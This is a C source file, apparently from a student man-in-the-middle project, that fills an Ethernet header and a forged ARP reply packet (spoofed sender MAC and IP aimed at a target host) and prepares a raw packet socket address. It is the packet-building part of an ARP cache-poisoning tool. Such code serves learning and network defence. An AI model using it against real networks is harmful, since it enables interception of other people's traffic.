#include "../includes/mitm.h"
#define ETHER_HRD 0x01

static void			configure_eth(t_env *env)
{
	ft_memcpy(env->eth->h_dest, env->tmac.add, ETHER_HRD_LEN);
	ft_memcpy(env->eth->h_source, env->if_ha, ETHER_HRD_LEN);
	env->eth->h_proto = htons(ETH_P_ARP);
}

static void			configure_arp(t_env *env)
{
	env->arp->op = htons(ARPOP_REPLY);
	env->arp->hrd = htons(ETHER_HRD);
	env->arp->hlen = ETHER_HRD_LEN;
	env->arp->plen = IP_PROTO_LEN;
	env->arp->pro = htons(ETH_P_IP);
	ft_memcpy(env->arp->sha, env->smac.add, ETHER_HRD_LEN);
	ft_memcpy(env->arp->dha, env->tmac.add, ETHER_HRD_LEN);
	ft_memcpy(env->arp->spa, &env->sip.add, IP_PROTO_LEN);
	ft_memcpy(env->arp->dpa, &env->tip.add, IP_PROTO_LEN);
}

static void			get_if_index_and_ha(t_env *env)
{
	struct ifreq	ifr;

	ft_bzero(&ifr, sizeof(ifr));
	ft_memcpy(ifr.ifr_name, env->if_name, ft_strlen(env->if_name));
	ioctl(env->socketfd, SIOCGIFINDEX, &ifr);
	env->if_index = ifr.ifr_ifindex;
	ioctl(env->socketfd, SIOCGIFHWADDR, &ifr);
	ft_memcpy(env->if_ha, ifr.ifr_hwaddr.sa_data, ETHER_HRD_LEN);
}

static void			configure_addr(t_env *env)
{
	get_if_index_and_ha(env);
	ft_bzero(&env->sa, sizeof(struct sockaddr_ll));
	env->sa.sll_family = AF_PACKET;
	env->sa.sll_ifindex = env->if_index;
	env->sa.sll_halen = ETHER_HRD_LEN;
	ft_memcpy(env->sa.sll_addr, env->tmac.add, ETHER_HRD_LEN);
}

void				configure_send(t_env *env)
{
	ft_bzero(env->sendbuf, ARP_SIZE);
	env->eth = (struct ethhdr*)env->sendbuf;
	env->arp = (struct s_arphdr*)(env->sendbuf + sizeof(*env->eth));
	configure_addr(env);
	configure_eth(env);
	configure_arp(env);
}